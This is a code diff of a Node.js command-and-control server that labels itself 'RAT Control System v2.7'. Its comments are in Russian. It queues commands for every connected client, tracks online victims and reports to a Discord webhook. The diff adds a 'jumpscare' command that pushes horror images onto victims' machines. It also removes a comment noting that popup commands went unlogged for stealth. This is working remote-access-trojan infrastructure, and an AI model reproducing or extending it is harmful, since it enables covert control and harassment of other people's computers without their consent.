@@ -18,7 +18,7 @@ async function sendDiscordMessage(title, description, color = 0x3498db, fields =
         fields: fields,
         timestamp: new Date().toISOString(),
         footer: {
-            text: "RAT Control System v2.6"
+            text: "RAT Control System v2.7"
         }
     };
 
@@ -72,7 +72,7 @@ const server = http.createServer((req, res) => {
         req.on('end', async () => {
             try {
                 const { command, args } = JSON.parse(body);
-                console.log(`📨 Получена команда: ${command}`, args);
+                console.log(`📨 Получена команда: ${command}`, args ? args : '');
                 
                 // Добавляем команду в очередь для ВСЕХ клиентов
                 commandQueue.push({
@@ -121,8 +121,18 @@ const server = http.createServer((req, res) => {
                         `**Тип:** ${args[0]}\n**Результат:** ${args[1]}`,
                         0x00ff00
                     );
+                } else if (command === "jumpscare") {
+                    const scareNames = {
+                        1: "Джефф Килер 👹",
+                        2: "Соник.exe 💀"
+                    };
+                    
+                    await sendDiscordMessage(
+                        "👻 Скример запущен!",
+                        `**Тип:** ${scareNames[args[0]] || "Неизвестный"}\n**Время:** ${new Date().toLocaleTimeString()}`,
+                        0xff0000
+                    );
                 }
-                // Команда popup НЕ логируется в вебхук для скрытности
 
                 res.end(JSON.stringify({ 
                     status: "OK",
@@ -241,7 +251,7 @@ const server = http.createServer((req, res) => {
         return;
     }
 
-    // Новый эндпоинт для получения списка пользователей
+    // Получение списка онлайн пользователей
     if (req.method === 'GET' && req.url === '/users') {
         try {
             cleanupInactiveUsers(); // Очищаем перед отправкой
@@ -270,7 +280,7 @@ const server = http.createServer((req, res) => {
         return;
     }
 
-    // Новый эндпоинт для обновления информации о пользователе
+    // Обновление информации о пользователе
     if (req.method === 'POST' && req.url === '/users') {
         let body = '';
         req.on('data', chunk => body += chunk);
@@ -304,7 +314,7 @@ const server = http.createServer((req, res) => {
         
         res.end(JSON.stringify({
             status: "online",
-            version: "2.6.0",
+            version: "2.7.0",
             timestamp: new Date().toISOString(),
             pending_commands: commandQueue.length,
             online_users: global.onlineUsers.size
@@ -318,9 +328,10 @@ const server = http.createServer((req, res) => {
 
 server.listen(process.env.PORT || 3000, () => {
     console.log("🚀 Сервер запущен на порту 3000");
-    console.log("📊 Версия: 2.6.0");
+    console.log("📊 Версия: 2.7.0");
     console.log("🔗 Webhook: " + WEBHOOK_URL);
     console.log("✅ Готов к приему команд");
     console.log("👥 Система отслеживания пользователей активна");
+    console.log("👻 Скример система: ДЖЕФФ & СОНИК");
     console.log("⏱️  Обновление данных каждые 15 секунд");
 });
